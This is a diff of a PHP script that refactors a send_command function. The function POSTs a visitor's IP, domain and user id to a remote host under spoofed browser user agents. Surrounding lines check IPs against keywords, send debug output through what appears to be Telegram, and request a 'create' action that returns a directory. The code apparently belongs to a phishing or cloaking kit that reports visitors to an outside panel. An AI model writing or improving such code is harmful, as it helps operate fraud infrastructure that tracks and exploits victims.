@@ -428,18 +428,28 @@ function check_keyword($ipAddress) {
     return false;
 }
 function send_command($ip, $url, $command, $id, $host) {
-    $userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36", ];
-    $randomUserAgent = $userAgents[array_rand($userAgents) ];
-    $fields = ["send_ip" => $ip, "send_domain" => $url, "return_domain" => $host, "send_action" => $command, "send_id" => $id, ];
+    $userAgents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
+    ];
+    $randomUserAgent = $userAgents[array_rand($userAgents)];
+    $fields = [
+        "send_ip" => $ip,
+        "send_domain" => $url,
+        "return_domain" => $host,
+        "send_action" => $command,
+        "send_id" => $id
+    ];
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_USERAGENT, $randomUserAgent);
     $response = curl_exec($ch);
     if (curl_errno($ch)) {
         $error_message = curl_error($ch);
+        curl_close($ch);
         return ["error" => "Curl error: " . $error_message];
     }
     curl_close($ch);
@@ -661,7 +671,7 @@ $log = url_packet();
 $debug_y = "Debug: $log";
 tele_message($debug_y);
 $result = send_command($ipAddress, $log, "create", $useriddec, $local_domain);
-$debug_y = "Log: " . json_encode($result);
+$debug_y = "Log: " . print_r($result, true);
 tele_message($debug_y);
 if (isset($result["res_status"]) && $result["res_status"] == "success") {
     $res_dir = $result["res_dir"];
